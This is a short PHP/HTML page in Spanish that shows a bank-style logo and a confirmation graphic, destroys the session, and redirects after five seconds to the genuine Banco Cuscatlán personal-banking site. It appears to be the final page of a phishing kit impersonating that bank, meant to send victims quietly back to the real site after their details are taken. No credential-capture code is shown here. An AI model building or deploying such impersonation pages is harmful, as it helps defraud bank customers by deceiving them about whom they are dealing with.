<?php
    session_start();
    
    header('Refresh: 5; URL=https://www.bancocuscatlan.com/persona');
    

    session_destroy(); 
?>
<!DOCTYPE html>
<html lang="es">
  <head>
    <meta charset="utf-8">  
    <title>En línea</title>
    <link rel="stylesheet" href="./sldr/style.css">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
  </head>
  <body style="background:#f2f2f2;">
    <style>*{margin:0px;padding:0px;}</style>
    <div id="main" style="background:#f2f2f2;">
      <nav id="nav1" style="background:#ffffff;height: 64px;display: flex;">
        <img id="lg1" src="./logo.png" alt="Home" style="height: 35px;align-self: center;margin-left: 10px;">
      </nav>
        
      <img class="icnimgs" src="./im/icn/top-left.png" style="position:absolute;top:120px;left:20%;width: 64px;height: 64px;">
      <img class="icnimgs" src="./im/icn/center-left.png" style="position:absolute;height:130px;top:260px">
      <img class="icnimgs" src="./im/icn/bottom-left.png" style="position:absolute; top: 510px;left: 10%;width: 90px;">
      <img class="icnimgs" src="./im/icn/top-right.png" style="position:absolute;right: 0;top: 82px;height: 220px;max-height: 100%;">
      <img class="icnimgs" src="./im/icn/center-right.png" style="position:absolute;top: 300px;right: 15%;width: 90px;">
      <img class="icnimgs" src="./im/icn/bottom-right.png" style="position:absolute;right: 0;bottom: 20px;width: 65px;">
      <style>
        @media  screen and (max-width:860px) {
          .icnimgs{
            display: none;
          }
        }
      </style>

      <div id="gtrx" style="text-align:center">
        <div id="gtr01" style="margin-top: 20px;display: inline-block; width: 310px;height:500px;background-image:url('./im/ext.svg');background-repeat:no-repeat;">
            
        </div>
        
    </div>


    </div>


  </body>
</html>